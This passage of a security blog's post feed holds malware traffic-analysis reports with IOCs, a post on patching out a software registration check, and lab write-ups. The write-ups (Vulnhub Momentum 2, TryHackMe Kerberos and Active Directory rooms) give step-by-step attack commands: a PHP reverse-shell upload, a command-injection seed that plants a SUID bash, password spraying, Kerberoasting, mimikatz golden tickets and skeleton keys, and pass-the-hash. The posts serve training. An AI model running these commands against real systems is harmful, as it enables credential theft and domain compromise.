(tcp.flags.syn == 1 &amp;&amp; tcp.flags.ack == 0 &amp;&amp; tcp.window_size&lt;=1024) || (tcp.flags.syn == 1 &amp;&amp; tcp.flags.ack == 0 &amp;&amp; tcp.window_size&gt;1024) || (tcp.flags == 0) || (tcp.flags == 0x001) || (tcp.flags.fin == 1 &amp;&amp; tcp.flags.push == 1&amp;&amp;tcp.flags.urg == 1) || (icmp.type == 3 &amp;&amp; icmp.code == 3) Network Attacks : (arp.duplicate-address-detected || arp.duplicate-address-frame) || (icmp &amp;&amp; data.len &gt; 48) || (dtp || vlan.too_many_tags) || (tcp.analysis.lost_segment || tcp.analysis.retransmission)These rules should help with your task. Right away, I could see the external IP lookup and started exploring it further.I started seeing strange GET/POST requests that were shown alongside an ARP scan looking for hosts.GET/POST requestsARP ScanI exported the downloaded files and ran them through VirusTotal and AlienVault. While some files did not trigger an alert, others did. As a result, any files downloaded from the same source became suspicious. Here are the following hashes from the exported files.After completing the manual analysis, I like to go through the process again using IDS/IPS solutions and create rules to detect the identified threats or check for pre-existing rules to understand how they are detected.Using Brim, a data management tool similar to Splunk, with its default Suricata alerts, it instantly detected and alerted me to the malicious traffic.Hancitor trafficFlicker Stealer trafficCobalt Strike trafficAfter further research, I identified the matches between the traffic and malware. I proceeded to fingerprint and match them to the MITRE ATT&amp;CK framework.HancitorFlicker Stealer : T1567 T1119Cobalt StrikeHere is my completed report on the subject.ReportExecutive SummaryAt approximately 16:00 UTC on 2021-02-08, a Windows host operated by the user Bill Cook showed signs of infection from three types of malware: Hancitor, Cobalt Strike, and Flicker Stealer.Details Details of the infected host: MAC: 00:12:79:41:c2:aa IP Address: 10.2.8.101 Hostname: DESKTOP-MGVG60Z Account Name: bill.cook Domain Controller: AscoLimited-DC.ascolimited.com IOCsAccording to VirusTotal and AlienVaultHancitor traffic 213.5.229.12 - port 80 - satursed.com - POST request for forum.php containing host information - 2021-02-08 16:00:10 5.124.85.55 - port 80 - tonmatdoanminh.com - GET request for uninviting.php gzip file - 2021-02-08 15:59:12Flicker stealer traffic 8.208.10.147 - port 80 - roanokemortgages.com - GET requests for /0801.bin, /0801s.bin, /6lhjgfdghj.exe - 2021-02-08 16:00:12 185.100.65.29 - port 80 - strange traffic being sent back and forth - 2021-02-08 16:00:17Cobalt strike traffic 198.211.10.238 - port 8080 - 198.211.10.238:8080 - GET requests for /6Aov, /ca - 2021-02-08 16:00:12 198.211.10.238 - port 443 - HTTPS traffic - 2021-02-08 16:00:13 198.211.10.238 - port 8080 - 198.211.10.238:8080 - Post system info to submit.php?id=3275377518 - 2021-02-08 16:01:49Other indicators 54.235.147.252 - port 80 - api.ipify.org - External IP lookup - 2021-02-08 16:00:06 10.2.8.101 - ARP Scan for host discovery starting with ICMP traffic to DNS server at 10.2.8.2 and gateway at 10.2.8.1 - 2021-02-08 16:01:31NotesGiven alerts from excersize:VirusTotal DetailsCobalt strike:Flicker Stealer:Hancitor:Generated alerts from BrimHancitor trafficFlicker Stealer trafficCobalt Strike trafficConclusionRecommendations: Quarantine infected machines: The infected machines should be removed from the network to prevent further spread of the malware. Conduct a forensic analysis: A forensic analysis should be conducted on the infected machines to determine the extent of the infection and identify any other potential security risks. Update antivirus software: Ensure that antivirus software is up-to-date and all machines on the network are scanned for malware. Update Firewall rules to blacklist traffic to C2 and malicious IPs Educate users: Educate users on how to identify and avoid potential malware infection vectors such as phishing emails, click jacking, and suspicious attachments.Conclusion:The presence of Hancitor, Cobalt Strike, and Flicker Stealer on the network is a significant security threat. Immediate action should be taken to prevent further spread and mitigate any damage caused by the malware. By following the recommendations outlined in this report, the organization can effectively mitigate the risk of future malware infections and strengthen its overall security posture." }, { "title": "Angry Poutine - Traffic Analysis", "url": "/posts/angry-poutine/", "categories": "traffic analysis", "tags": "blueteam, wireshark, pcap, networking", "date": "2023-03-29 12:00:00 -0700", "snippet": "Welcome to the start of my Traffic Analysis training! I’m wanting to do this not only because its new to me and I find it interesting, but also to develop hands-on experience and practice the concepts and procedures for being an analyst.The site I will be using to get PCAPS for the practice analysis is Malware Traffic Analysis . If you want to follow along with the specific PCAP I will be using you can find it hereNow onto the task!!Side note:Unfortunately the task objectives are right above the answers so just don’t peek down at them ;PFor reference I’ve written them down here.Task• Write an incident report based on the PCAP and alerts. • The incident report should contain the following: \t• Executive Summary \t• Details (of the infected Windows host) \t• Indicators of Compromise (IOCs)Steps TakenGiven the tasks I now open the PCAP in Wireshark. First thing i did is go to the statistics tab &gt; conversations, to get a view of relevant traffic. I start looking at the info in the TCP tab, and see many IPs that are using port 80. I decide to start their due to traffic nowadays normally being sent over port 443 using SSL/TLS. I sort the traffic out using the amount of packets, and begin on the one with the most traffic. Taking a glance looking at the lists for anything that would stick out like GET or POST requests I saw something odd that narrowed my search down to this IP: 194.62.42.206 What caught my eye was a GET request to a site: http://simpsonsavingss.com/bmdff/BhoHsCtZ/MLdmpfjaX/5uFG3Dz7yt/date1?BNLv65=pAAS Copying the URL I put the URL into Virustotal and got hits for it being malicious. We now know that it is fairly certain that this URL is malicious in some form or fashion. With this information I go to the main Wireshark page and click View &gt; Time Display Format &gt; UTC Time of Day. To change the time format to UTC ( just to make it more comprehensible for others.) and note the time and date of the event. Date: Fri, 10 Sep 2021 23:17:14 GMT I then start filtering for the hosts information using the IP address of the victim, found while looking at the packet that made the get request, and filters for the following: kerberos.CNameString for username and host name information (could have used nbns traffic to find the hostname as well) useragent string in the GET request for the host OS and MAC(Windows NT 10.0 aka Windows 10) Once I gathered all the host’s info I extracted the file by going to File &gt; Export Objects &gt; HTTP …, selected the file associated with the URL found previously and grabbed an md5sum of it using the commandline .md5sum 'date1?BNLv65=pAAS'eed363fc4af7a9070d69340592dcab7c78db4f90710357de29e3b624aa957cf8 I then went back to Virustotal and checked the file hash and found the following information. File Info from Virustotal.com File type Win32 DLL Potential IP Traffic on our victim system for C2 communication according to virus total known IPs 167.172.37.9:443 (TCP) 94.158.245.52:443 (TCP) Name of Malware: trojan.kryplod/bazar Looking back at the TCP tab under conversations I see that 2 IPs mentioned in the virus total report are in fact talking back and forth in the PCAP. This is pretty much all for this analysis. Here is how the following report might look.(Never did this before so I had ChatGPT draft a template for me to fill out LOL. Amazing resource BTW ;P)Bazar C2 InfectionDate: 2023-03-30Overview:The purpose of this report is to outline the findings of a malware analysis and provide recommendations for mitigation. The malware was discovered during a PCAP analysis and was identified as a security threat.FindingsExecutive SummaryOn Fri, 10 Sep 2021 23:17:14 GMT, a Windows 10 system used by Hobart Gunnarsson was infected with BazarC2 malwareDetails: Malware Type: Malicious DLL Trojan Malware Name: Bazar IP Address of Infected Machine(s): 10.9.10.102 Infection Vector: HTTP GET RequestDetails (of the infected Windows host) MAC: 00:4f:49:b1:e8:c3 Host name: DESKTOP-KKITB6Q Host IP: 10.9.10.102 Host OS: Windows 10 Username: hobart.gunnarssonIndicators of Compromise (IOCs)194.62.42.206:80 - simpsonsavingss.com - downloaded /bmdff/BhoHsCtZ/MLdmpfjaX/5uFG3Dz7yt/date1?BNLv65=pAASVirustotal output for the malicious URL hereActive C2 communications over 167.172.37.9:443 - HTTPS Traffic 94.158.245.52:443 - HTTPS TrafficVirustotal output for the downloaded malicious file hereNotesThe malware was analyzed using manual techniques with Wireshark. The analysis revealed that the malware was designed to maintain persistence and elevate privileges to establish secure C2 connections. The malware communicated with a C2 server located at: 167.172.37.9:443 94.158.245.52:443Sending encrypted data over the network.Recommendations: Quarantine infected machines: The infected machines should be removed from the network to prevent further spread of the malware. Conduct a forensic analysis: A forensic analysis should be conducted on the infected machines to determine the extent of the infection and identify any other potential security risks. Update antivirus software: Ensure that antivirus software is up-to-date and all machines on the network are scanned for malware. Update Firewall rules to blacklist traffic to C2 IPs Educate users: Educate users on how to identify and avoid potential malware infection vectors such as phishing emails, click jacking, and suspicious attachments.Conclusion:The presence of Bazar on the network is a significant security threat. Immediate action should be taken to prevent further spread and mitigate any damage caused by the malware. By following the recommendations outlined in this report, the organization can effectively mitigate the risk of future malware infections and strengthen its overall security posture.And so concludes my first part in a series of Traffic Analysis Posts. Hope you enjoyed!" }, { "title": "Binary Reverse Engineering (Cracking inhouse software)", "url": "/posts/binary-reverse-engineering/", "categories": "realworld", "tags": "hacking, windows, binary", "date": "2023-02-09 11:00:00 -0800", "snippet": "Where have i been?First apologies for the 4 month hiatus. Family things you know. Any who on to the main course!Binary Reverse EngineeringIn this post, I’ll be going over the process I used to reverse engineer a program I was given at work. Unfortunately I can only show select screenshots from the process due to confidentiality purposes.The program was an old in-house build from over a decade ago, running on a Windows 7 PC in a corner. The person who had made it abandoned it after locking it, out of spite as a last “Screw you” to their supervisor.The issue was that a patch was pushed to the program, requiring a registration key upon execution and not allowing users to log in. For the past decade, the shop had been reduced to using Excel and a notepad for logging and monitoring the in-house job. When I came in, I was told about this program that would automate the entire job and track everything.I offered to take a look at the program and see if I could do anything about it. I had no experience whatsoever in reverse engineering or messing with assembly or coding in C. It was a full-on “unknown unknown” for me. Between family life, work, and studying, I poked around and tried different things with the program. Here was my general workflow over a year on what I did.First, I pulled a copy of the program from work. Then, I ran strings on the program using different encoding methods to see if anything would come out. I saw no hard-coded registration key tho I did find a few helpful strings.AndSeeing these I figured that their is a way to bypass the check somehow for the key and the credentials for the Admin user was “12345”.Armed with this, I proceeded in finding out how this would work. I heard about Ghidra and how it is used to reverse engineer programs. I instantly tried to run this against it, but I was completely lost and had no idea what I was doing.Over time, I fiddled around and explored the different functions and what all I could do. I learned how to filter the strings and look through functions, etc. However, I had never coded in C other than an Arduino script for a few robotics projects, and I had never looked at or messed with assembly in my life.After mindlessly looking through the assembly and functions that Ghidra was able to parse out, I remembered from the strings command earlier that I saw some things that were describing a registration key, and completing the registration. I thought to myself, “I found it!!” and then had no idea where to go from there.When hovering over the calls it showed me the function associated with it.Clicking it it brought me to that section of the code and i began to look around and try and make sense of it.After watching a few YouTube videos, I learned that there was a way to edit the command to have it execute different things. Again, I had no idea how to write assembly or really read it. I just used context clues as to what things might mean and from prior experience with software development, web exploitation and using null bytes, I figured this could work here.I tried it on multiple different calls, exporting the program each time, attempting to run it and see if I had done it. After the 8th or 20th attempt at changing the calls to “PUSH 0x0,” which I thought was a null input, I found the correct part in memory that does the validation and successfully bypassed the registration key check, enabling the program to finally be used.I had to change this :To this :I know the better solution would be to rewrite a new management software. However, as the system is fully offline and there is no viable threat, it will be fine. Plus, this gave me a whole new skill to learn more about, along with massive respect from higher-ups.This concludes my overview of cracking some old in-house software.EDIT: After a few days of them trying to use it. They found out that it was to outdated and buggy in how it worked. I ultimately got recruited to rewrite similar software from scratch. Write-up coming soon on my process!" }, { "title": "Vulnhub Momentum 2 Writeup", "url": "/posts/momentum-2-writeup/", "categories": "ctf", "tags": "hacking, writeup, web, linux", "date": "2022-10-07 12:00:00 -0700", "snippet": "Momentum 2Here we will be going over the Momentum 2 box from Vulnhub. This box will test your ability on enumeration, web exploitation, and Linux privilege escalation.Part 1Before we start. Lets add the machines IP to an environment to make things easier on us.set IP = &lt;box-IP&gt;Now that’s done lets begin:As with all boxes we start with our network enumeration.nmap -sC -sV -oN nmap/initial $IPHere we see we have 2 ports open:# Nmap 7.92 scan initiated Fri Sep 23 08:36:58 2022 as: nmap -sC -sV -oN nmap/initial 172.16.42.164Nmap scan report for 172.16.42.164Host is up (0.00044s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey:| 2048 02:32:8e:5b:27:a8:ea:f2:fe:11:db:2f:57:f4:11:7e (RSA)| 256 74:35:c8:fb:96:c1:9f:a0:dc:73:6c:cd:83:52:bf:b7 (ECDSA)|_ 256 fc:4a:70:fb:b9:7d:32:89:35:0a:45:3d:d9:8b:c5:95 (ED25519)80/tcp open http Apache httpd 2.4.38 ((Debian))|_http-server-header: Apache/2.4.38 (Debian)|_http-title: Momentum 2 | IndexService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Fri Sep 23 08:37:05 2022 -- 1 IP address (1 host up) scanned in 6.70 secondsSince we have a web port open running Apache we can begin enumeration on that URL using Gobuster. ( Ensure to specify the file extensions you are looking for otherwise you will be stuck on this point. )gobuster dir -u http://$IP -w ~/Hack/wordlists/dirbuster/directory-list-2.3-medium.txt -x .cgi,.txt,.php,.html,.py,.sh,.jpg,.png,.bak,.php.bak -t 100 You should see output similar to this.===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://172.16.42.164[+] Method: GET[+] Threads: 100[+] Wordlist: /home/user/wordlists/dirbuster/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Extensions: sh,jpg,bak,cgi,txt,php,html,py,png,php.bak[+] Timeout: 10s===============================================================2022/10/05 19:29:36 Starting gobuster in directory enumeration mode===============================================================/img (Status: 301) [Size: 312] [--&gt; http://172.16.42.164/img/]/index.html (Status: 200) [Size: 1428]/ajax.php (Status: 200) [Size: 0]/css (Status: 301) [Size: 312] [--&gt; http://172.16.42.164/css/]/ajax.php.bak (Status: 200) [Size: 357]/manual (Status: 301) [Size: 315] [--&gt; http://172.16.42.164/manual/]/js (Status: 301) [Size: 311] [--&gt; http://172.16.42.164/js/]/dashboard.html (Status: 200) [Size: 513]/owls (Status: 301) [Size: 313] [--&gt; http://172.16.42.164/owls/]/server-status (Status: 403) [Size: 278][!] Keyboard interrupt detected, terminating.===============================================================2022/10/05 19:31:17 Finished===============================================================We can see a few interesting files we might want to check out: owls dashboard.html ajax.php.bakbrowsing to the first, we see a page that displays a directory tree we can access.Browsing to the second, we see an uploads page.Browsing to the last, we are able to download the file.After the download is complete we see some useful information. //The boss told me to add one more Upper Case letter at the end of the cookie if(isset($_COOKIE['admin']) &amp;&amp; $_COOKIE['admin'] == '&amp;G6u@B6uDXMq&amp;Ms'){ //[+] Add if $_POST['secure'] == 'val1d' $valid_ext = array(\"pdf\",\"php\",\"txt\"); } else{ $valid_ext = array(\"txt\"); } // Remember success upload returns 1 % Here we see that if we add the correct admin cookie and a second post parameter of secure = val1d, then we can upload .php files to the uploads page.To do this we can use Burpsuite to intercept the request and manipulate it to send our php reverse shell.First lets get our PHP reverse shell from PentestMonkey and ready by adding our IP and a port we want to listen on in the fields listed in the Revshell.Here is what needs to be added to the request as stated in the ajax.php.bak.Send the request over to intruder to find out the last digit. Add the squiggle “s” to the end of the cookie and go to payloads.Under payloads add uppercase letters to the list and hit start attack.You should see a “1” in the response from “R” indicating that is the letter needed. Add the letter to the end of the cookie in the proxy tab. Forward the request and the shell should go through.Open a terminal, and open a listener on the port you put in the reverse shell. Go to the owls page and select your shell. You now have a shell on the machine!Now that your on you can start looking for privesc routes. Being the “www” user you have basically no rights. So we need to see if their are any ways from our current user to root or another user. We see in the home directory that their is a user named “athena” and she has her password written down in a file in her directory. We use this to switch to her account.su athenaAs athena we can read the user flag in her home directory.Now first thing I normally do, is see if I have sudo privilege to any files or binaries.sudo -lI see that as athena we are able to run a python script as root. This script takes a seed we give it and outputs an admin cookie for the site. We can abuse this due to no input filters put in place and spawn a shell by adding this to out seed.I tried  ”bash -i” with the seed. For an example.1;bash -iIt didn’t quite work due to it spawning an unstable dead shell.So I tried to add the SUID bit to bash by copying the binary to /tmp and using this in place of “/bin/bash” when running the shell.1;cp /bin/bash /tmp/bash;chmod u+s /tmp/bashFinally I can gain a root shell by using./tmp/bash -pYou now have a root shell and can retrieve the root flag.This concludes the momentum series from Vulnhub! follow me on my socials for more!" }, { "title": "THM Red Team Fundamentals Overview", "url": "/posts/thm-red-team-fundamentals-overview/", "categories": "tryhackme, info", "tags": "writeup, hacking, red-team", "date": "2022-09-30 12:00:00 -0700", "snippet": "Red Team Fundamentals OverviewHello! For this post I will be giving an overview of the content provided in the first section of the new Red Team pathway - Red Team Fundamentals. If you want the TL;DR, It was very informative and if you don’t know anything about the red team you will learn a lot!Now to kick it off with the first room Red Team Fundamentals.Red Team FundamentalsMy thoughts and writeups on new Red Team pathway from TryHackMe Red Team fundamentals. Here we will be discussing the information associated with the fundamentals of breaking in (legally).So what is a Red Teamer and what do they do?A Red Team is the internal or external group that will perform penetration test on a network to ensure compliance, physical security, and bring to light the holes in the network the blue team might not have seen.Objectives from the room are to explain in broad detail the basics of what the Red Team does.The info provided in this room was very informative. The steps, roles, and overall structure of how a red team operates was great to get insight on and what would be required if you where to enter the field.Red Team EngagementsHere we will be going more in depth on Red Team engagements touched on in the last section.This room outlined the types of engagements, rules, plans, and documentation of said engagements.Here we learned about what a “Scope” is and the difference between the 2 main types of engagements. The main takeaway was the engagements for me. From going through the Cyber Defense pathway i learned how the blue team can build their security based on the TTP’s and knowing this the red team can test if the counter measures are viable within the given rules put in place by the company or customer. Breaking down the planing faze helped me understand the “upgrade” from CTF to enterprise tests. outlining the documentation that will be provided to the customer after the pentest and the variations there ofRed Team Threat IntelHere we will go over the Threat Intel room.Coming from a military background this room was very familiar to me. we often have exercises that consist of simulated adversary chemical attacks, so the cyber implementation of learning the attacks of the adversary and building plans and tactics around them using frameworks like MITRE ATT&amp;CK for intel gathering along with logs is a lot of fun.Intro To C2This was my favorite of the 5. While I knew what C2 did, I did not know all the in depth info that was provided. Now i will say that on Task 6 i was having a bit of trouble. As much as I wanted to learn how to use Armitage I could not figure out how to set it up on my machine nor use the provided one in the Attackbox. the error i consistently received forums said that it was deprecated and that could be the reason it would not load or install properly. I ultimately decided to go ahead and just use what i know best and go old school CLI and just use metasploit. if you would like to see what i did to get around it please continue if you don’t want spoilers continue to the next section.the first thing i did as it stated in the task was an nmap scan of the IP to see what services where open.i see that smb is available and that the os is win7 and the machines name was ted-pc. while reading it mentioned eternal blue, and having exploited this vulnerability before in the blue room ctf.once exploited i dumped the user hashes to answer the questions by usingcommandand for the user flags we can spawn a shell with meterpreter as system and get both located in their respective desktop directoriesConclusionAnd so concludes my thoughts on the start of this pathway. I highly recommend anyone who has an interest in Red Teaming or Cyber Security in general take a look at this path and other rooms on TryHackMe!" }, { "title": "THM Attacking Kerberos Writeup", "url": "/posts/attacking-kerberos/", "categories": "tryhackme, ctf", "tags": "writeup, hacking, active-directory", "date": "2022-08-30 12:00:00 -0700", "snippet": "Attacking KerberosWelcome to my THM Attacking Kerberos writeup. I will only be covering the more technical aspects of the room instead of the reading definition or reading based questions. If you need any help with this you’ve come to the right place! Please follow along!Task 2This task starts off with a bit more setup by adding the domain+IP of the machine to your /etc/hosts file for following the commands for the rest of the room. you can add this manually through your text editor or from terminal via: ( $IP is the environment variable I set for every machine as to not have to remember and consistently copy/paste when needed )To set the environment variable.set IP=&lt;thm-machine-ip&gt;Add machine to your /etc/hosts.echo $IP contrller.local &gt;&gt; /etc/hostsNow we will need to pull down the Username and Password files provided for the room.git clone https://github.com/Cryilllic/Active-Directory-WordlistsNow we get to the main part of this task. Here we will start our user enumeration on kerberos via kerbrute. ( all following commands will be run in the same directory we downloaded the wordlists )kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local Active-Directory-Wordlists/User.txtOnce ran we should see the following output.From this output you will be able to answer the questions for the task.Task 3For this task we will need to have remote access to the machine. This can be achieved via SSH or RDP. For this guide I will be using remmina to RDP into the machine.Open remmina and click the new connection icon.Next change the protocol to RDP and add all required credentials and connect.once connected open a command prompt, navigate to the Downloads directory, and run this command: ( This command runs rubeus and calls the harvest command. this collects the tickets being sent to the KDC or Key distribution center, and checks every 30 seconds)Rubeus.exe harvest /interval:30You should see the output bellow.With this output you will be able to answer the task questions however please continue with the task instructions to learn password spraying via rubeus.Before attempting the password spraying we will need to add the machine to the windows hosts file.echo $IP CONTROLLER.local &gt;&gt; C:\\Windows\\System32\\drivers\\etc\\hostsOnce added we can begin the attack.The following command calls the brute function to start a brute force attack, and passes the password variable along with the noticket option to spray the given password to all available tickets to see if their is a match.Rubeus.exe brute /password:Password1 /noticketYou should see the output bellow.Here you see that the user Machine1 has a password of Password1Task 4As stated in the task “Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account”Lets start the roast!Again we start with rubeus and of course to start the roast we call kerberoast.Rubeus.exe kerberoastOnce done you should see the following output.now copy and paste the hashes provided onto your attack machine and crack the hash.for this room we use hashcat however john the ripper works just as well. do this for both hashes.hashcat -m 13100 -a 0 hash.txt Active-Directory-Wordlists/Pass.txt`Once cracked you should have the passwords here:MYPassword123#Summer2020If you get no output try the following command to check cracked hashes ( change the hash.txt to each hash file you have to show )hashcat --show hash.txtTo do the same thing but remotely without needing rubeus installed on the target we can use this impacket python script to achieve the answersGetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.205.63 -requestTask 5For this task we will be attacking in another popular method as-rep roasting. As discussed in the task “ AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled.” to exploit this we must do the following:Execute this on the target machine. same as kerberoasting.Rubeus.exe asreproastYou should get this outputIn the task it says to insert a 23 after the kerb5asrep in the hash however you can still retrieve the password without this step.Now same as the last task crack those hashes!hashcat -m 18200 hash.txt Active-Directory-Wordlists/Pass.txtyou can also use johnjohn --format=krb5asrep --wordlist=Active-Directory-Wordlists/Pass.txt hash.txtAgain if you error out you can run the –show option for both cracking tools to see the passwordjohn --show hash.txthashcat --show hash.txtTask 6Now we will start exploring the use of Mimikatz. first things first ensure you have proper permissions to run mimikatzdo so by enteringprivilege::debugyou should see the following output.one thing we can do is grab all available client tickets on the machine.sekurlsa::tickets /exportYou will see a lot of output like the following. This command just grabbed all the available tickets and placed them within your working directory. In this case, Downloads.You can see this in file explorer herenow to “login” as one of these users using the following command.kerberos::ptt [0;77e19]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCALYou should receive this output.To see if we are now accessing the other account you will want to exit mimikatz and runklistHere you will see the client is now showing as AdminYou have successfully passed the hash!!Task 7Here we will be discussing how to make a silver ticket. As stated in the task, “KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients. If you impersonate this account and create a golden ticket form the KRBTGT you give yourself the ability to create a service ticket for anything you want.”To start this off we will need to start off the same way as we did in the other mimikatz tasks.mimikatz.exe andprivilege::debugThen we will runlsadump::lsa /inject /name:krbtgtAs stated in the task, “This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.”Example output belowAs the task said “This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.”goldenKerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt:&lt;NTLM HASH&gt; /id:500silverKerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt:&lt;NTLM HASH&gt; /id:1103This will spawn a new command prompt with the privileges of the new ticketmisc::cmdDo the first step we did to dump the NTLM hash but change the name to Administratorlsadump::lsa /inject /name:AdministratorThe output will provide your answer for the task.Same here but name = sqlservicelsadump::lsa /inject /name:sqlserviceThe output will provide your answer for the task.Task 8Here we will be using a kerberos backdoor from mimikatz called a skeleton key.As discussed in the task “ A Kerberos backdoor acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password.” once mimikatz is installed on the target it is rather simple to use.simply follow these commandsTo start Mimikatzmimikatz.exeTo check if your privilege is okprivilege::debugTo get your skeleton keymisc::skeletonnow you will be able to access nearly anything you need or require. As stated in the task ‘The default hash for a mimikatz skeleton key is 60BA4FCADC466C7A033C178194C03DF6 which makes the password -“mimikatz” ‘for example to access the admin share you could use this command.net use c:\\\\DOMAIN-CONTROLLER\\admin$ /user:Administrator mimikatzto access directories you could use a command similar to:dir \\\\Desktop-1\\c$ /user:Machine1 mimikatzConclusionAnd we are done! Over all I enjoyed this room and it was amazingly informative in these basic techniques on attacking kerberos.Thank you for reading!" }, { "title": "THM Attacktive Directory Writeup", "url": "/posts/attacktive-directory/", "categories": "tryhackme, ctf", "tags": "writeup, hacking, active-directory", "date": "2022-08-29 12:00:00 -0700", "snippet": "Attacktive DirectoryThis is a basic active directory box on THM to learn a simple flow on attacking active directory.Follow along with the first 3 tasks to get things setup for yourself either on your own machine or just use the Attackbox.I will be starting at task 3.Task 3First thing I always start with when enumerating a machine is NMAP.nmap -sC -sV -oN nmap/inital $IPlooking at the first question they ask:What tool will allow us to enumerate port 139/445?A quick google search shows that enum4linux can assist in this.The next question we have is:What is the NetBIOS-Domain Name of the machine?Now we can use enum4linux for enumeration.enum4linux -a $IPThis will give us a alot of output but all we need is this.Here you can see the NetBIOS domain name of the machineTHM-ADNext we have:What invalid TLD do people commonly use for their Active Directory Domain?A TLD is the Top Level Domain. Essentially it is the .com, .net, .org etc… generally on a local system such as homelabs or internal networks it will be set to .local. You can see that in the note before the questions in task 3.therefore the answer is.localTask 4Reading the task, we need to download the user and password lists.I pull them down with curlcurl -o user.txt https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txtcurl -o pass.txt https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txtusing these we can use kerbrute to further enumerate the system.looking at the first question:What command within Kerbrute will allow us to enumerate valid usernames?To find this we can simply runkerbrute -hwhen looking at the documentation you should see that userenum is what your looking for.Next we are asked these questions:What notable account is discovered? (These should jump out at you)What is the other notable account is discovered? (These should jump out at you)To find the answers we will use the userenum command with kerbrute to find them.kerbrute --dc $IP -d spookysec.local userenum user.txtas you can see the 2 names that stick out to have some privilege or usage in the system.also save the hash that was dumped. you will need this later ;PTask 5From our previous enumeration we found a hash for the user svc-admin copy that into a file.For the first question:We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?you see it is asking for the user we got the hash from. svc-userNow next question:Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)for this we go to the hashcat website and search for the first part of the hash $krb5asrep$here we see it is a Kerberos 5, etype 23, AS-REP hash and the mode is 18200.Now crack the hash with the modified password list provided, what is the user accounts password?For me I like using john the ripper instead of hashcat so i used the commandjohn --format=krb5asrep --wordlist=pass.txt hash.txtonce done you will get the password management2005Task 6Now we get to start using the impacket tools! For the first question:What utility can we use to map remote SMB shares?a quick google search will reveal the answer smbclientFor the next question:Which option will list shares?simply look at the man pages/documentation for this answerUse the answer you found above and list out the shares.How many remote shares is the server listing?smbclient -L \\\\\\\\$IP\\\\ -U=spookysec.local/svc-adminNow there is one particular share that we have access to that contains a text file. Which share is it?For this question we see one of the sharenames is lowercase. while this is not indicative of a file we have access to it stuck out to me due to it sharing a name with a user we enumerated earlier.To list out what is in the file we need to execute this.smbclient \\\\\\\\$IP\\\\backup -U 'svc-admin'What is the content of the file?use the command more to see what is in the file.Decoding the contents of the file, what is the full contents?now looking at the contents we see it base64. to decode, place the hash in a file and we can do thisbase64 -d backup.txtand you will have your answer.Task 7What method allowed us to dump NTDS.DIT?To solve this we need to dump the systems user hashes.we can do so by using the following command:secretsdump.py -dc-ip $IP backup:backup2517860@$IPas you can see the method used was DRSUAPIWhat is the Administrators NTLM hash?after running the above command you can see the admin hash dumped. It will be the 4th set of characters.What method of attack could allow us to authenticate as the user without the password?the method used here was pass the hash. If you would like to read more on this method checkout this article on the subject from crowdstrikeUsing a tool called Evil-WinRM what option will allow us to use a hash?to answer this checkout the man page for the tool.Task 8For this task we are to find the flags on each of the users desktops.once logged in with Evil-WinRM you should be administrator and have access to all the desktopsHere’s the syntax for the command:evil-winrm -i $IP -u Administrator -H $admin-hashI’ll let you find these out ;Pand that concludes the room thank you reading!" }, { "title": "Windows Server 2019 Install", "url": "/posts/active-directory-install/", "categories": "homelab, software", "tags": "windows, active-directory, dns", "date": "2022-08-26 12:00:00 -0700", "snippet": "Active Directory InstallToday I will be going over my Windows Server installation. I will be using this as my domain controller by setting up Active Directory along with DNS for my local systems.Proxmox setup To start it all off we will need the ISO for our install. You can download it here. This will only be able to be used for 180 days however I will outline a way to extend this timer if needed. Once downloaded you can either go bare metal or virtual. for me I will be installing this on Proxmox so for this I will need to upload the ISO to the server over the web interface. Now that it is uploaded proceed to making the VM.\t1. Name: windows-server-19\t2. ISO image: winserver2019.iso\t3. Type: Microsoft Windows\t4. Version: 10/2016/2019\t5. Qemu Agent: check mark\t6. Disk Size: 50gib\t7. Bus/Device: SCSI\t8. SCSI controller: Virtio SCSI\t9. Cache: write back\t10. Discard: check mark\t11. Cores: 2 (this is all i needed)\t12. Memory: 4096 (again all i needed)\t13. Bridge: vmbr1 (this is my bridge for my Pfsense install within Proxmox.) Another thing we will need to do if installing on Proxmox is the virtio ISO drivers. this will improve compatibility and performance of windows when virtualized. Download the virtio drivers here. Upload the ISO to Proxmox. Now go to the hardware tab of the windows server VM and add a CD/DVD drive with virtio-win.iso selected. Now you are ready to boot.Windows Install Start following the installation wizard up to which OS you want to install. I chose the desktop version due to simplicity of using a GUI but feel free to install just the server core for a smaller attack surface over all. Get to custom or upgrade. Select custom and new. Create Your install should be running now. This will take a while. Now to ensure all drivers are good head over to the device manager and click on anything with a driver issue. Click Update Driver. Select Browse my computer. Browse to the virtio disk and check the include sub folders box and run. Once all are good you have a working base install. ( if you are in a VM like me now would be a good time to take a snapshot or backup of the VM in case we mess something up in the future ;)Install Active Directory &amp; DNSNow to install Active Directory and DNS on this server. Head over to server manager located in the start menu if it did not auto start. At the top right locate the manage button and select “ Add roles and features”. Select next up till you get to server roles. Select both “DNS” and “active directory domain services”. Continue and install. now on the main page of server manager locate the flag next to the manage button. you will see that the system needs to be promoted to a domain controller. select the hyperlink in the 